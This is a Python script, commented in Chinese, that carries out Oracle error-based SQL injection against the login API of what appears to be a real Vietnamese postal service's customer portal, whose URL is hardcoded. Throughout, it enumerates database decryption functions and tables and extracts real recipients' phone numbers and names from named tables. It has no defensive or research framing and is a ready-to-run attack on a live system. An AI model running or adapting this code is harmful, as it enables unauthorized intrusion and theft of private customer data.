#!/usr/bin/env python3
"""
查找数据库解密方法的专用脚本
"""

import requests
import json
import time
import re

class DecryptFinder:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_decrypt_functions(self):
        """查询解密相关的函数"""
        print("\n" + "=" * 80)
        print("🔍 查询1: 查找解密相关的函数和过程")
        print("=" * 80)
        
        queries = [
            ("解密函数(DECRYPT)", "SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '%DECRYPT%' AND OBJECT_TYPE='FUNCTION' AND ROWNUM<=3"),
            ("解密过程(DECRYPT)", "SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '%DECRYPT%' AND OBJECT_TYPE='PROCEDURE' AND ROWNUM<=3"),
            ("真实数据函数(REAL)", "SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '%REAL%' AND ROWNUM<=3"),
            ("解密包(PKG)", "SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '%DECRYPT%' AND OBJECT_TYPE='PACKAGE' AND ROWNUM<=2"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            print(f"   SQL: {query}")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 找到: {result}")
            else:
                print(f"   ❌ 未找到或查询失败")
            time.sleep(1)
    
    def query_decrypt_tables(self):
        """查询包含真实数据的表"""
        print("\n" + "=" * 80)
        print("🔍 查询2: 查找可能包含真实数据的表")
        print("=" * 80)
        
        queries = [
            ("TEMP_DATA表", "SELECT TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%TEMP_DATA%' AND ROWNUM<=2"),
            ("DECRYPT表", "SELECT TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%DECRYPT%' AND ROWNUM<=2"),
            ("REAL表", "SELECT TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%REAL%' AND ROWNUM<=2"),
            ("LOG表", "SELECT TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%LOG%' AND OWNER='EMS' AND ROWNUM<=3"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 找到: {result}")
            else:
                print(f"   ❌ 未找到")
            time.sleep(1)
    
    def test_known_mabc(self):
        """测试已知MABC能否查到真实数据"""
        print("\n" + "=" * 80)
        print("🔍 查询3: 测试已知MABC=100916的真实数据")
        print("=" * 80)
        
        # 测试不同的表
        test_tables = [
            "EMS.E1E2_PH_TEMP_DATA2_LOG",
            "EMS.E1E2_PH_LOG",
            "EMS.E1E2_PH_DECRYPT_DATA",
        ]
        
        for table in test_tables:
            print(f"\n🔎 测试表: {table}")
            
            # 查询电话
            query = f"SELECT DIENTHOAINHAN FROM {table} WHERE MABC='100916' AND ROWNUM=1"
            print(f"   SQL: {query}")
            
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 真实电话: {result}")
                
                # 如果找到电话，也查询姓名
                query2 = f"SELECT NGUOINHAN FROM {table} WHERE MABC='100916' AND ROWNUM=1"
                name = self.extract_via_error(query2)
                if name:
                    print(f"   ✅ 真实姓名: {name}")
                
                return True
            else:
                print(f"   ❌ 未找到或查询失败")
            
            time.sleep(1)
        
        return False
    
    def test_decrypt_functions(self):
        """测试解密函数"""
        print("\n" + "=" * 80)
        print("🔍 查询4: 测试解密函数")
        print("=" * 80)
        
        test_cases = [
            ("DECRYPT_PNS", "SELECT EMS.DECRYPT_PNS('++++++5747') FROM DUAL"),
            ("DECRYPTDATAWITHXOR", "SELECT EMS.DECRYPTDATAWITHXOR('++++++5747','KEY') FROM DUAL"),
        ]
        
        for name, query in test_cases:
            print(f"\n🔎 测试函数: {name}")
            print(f"   SQL: {query}")
            
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 返回: {result}")
                if result != '++++++5747' and result != 'NULL':
                    print(f"   🎉 解密成功！真实值: {result}")
            else:
                print(f"   ❌ 函数调用失败")
            
            time.sleep(1)
    
    def query_table_structure(self):
        """查询E1E2_PH_TEMP_DATA2_LOG表结构"""
        print("\n" + "=" * 80)
        print("🔍 查询5: E1E2_PH_TEMP_DATA2_LOG表结构")
        print("=" * 80)
        
        # 查询前5个字段名
        for i in range(1, 6):
            query = f"SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='E1E2_PH_TEMP_DATA2_LOG' AND OWNER='EMS') WHERE RN={i}"
            print(f"\n🔎 字段{i}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1)
    
    def query_sample_real_data(self):
        """查询样本真实数据"""
        print("\n" + "=" * 80)
        print("🔍 查询6: 从E1E2_PH_TEMP_DATA2_LOG提取样本数据")
        print("=" * 80)
        
        # 查询第一条记录的MABC
        query1 = "SELECT MABC FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE ROWNUM=1"
        print(f"\n🔎 查询第一条记录的MABC:")
        mabc = self.extract_via_error(query1)
        if mabc:
            print(f"   ✅ MABC: {mabc}")
            
            # 查询该MABC的完整信息
            query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            phone = self.extract_via_error(query2)
            if phone:
                print(f"   ✅ 真实电话: {phone}")
            
            query3 = f"SELECT NGUOINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            name = self.extract_via_error(query3)
            if name:
                print(f"   ✅ 真实姓名: {name}")
        else:
            print("   ❌ 查询失败")
    
    def run_all_queries(self):
        """运行所有查询"""
        print("=" * 80)
        print("🔓 数据库解密方法查找工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功 (状态码: {response.status_code})")
        
        # 执行所有查询
        self.query_decrypt_functions()
        self.query_decrypt_tables()
        self.test_known_mabc()
        self.test_decrypt_functions()
        self.query_table_structure()
        self.query_sample_real_data()
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    finder = DecryptFinder(target_url)
    finder.run_all_queries()
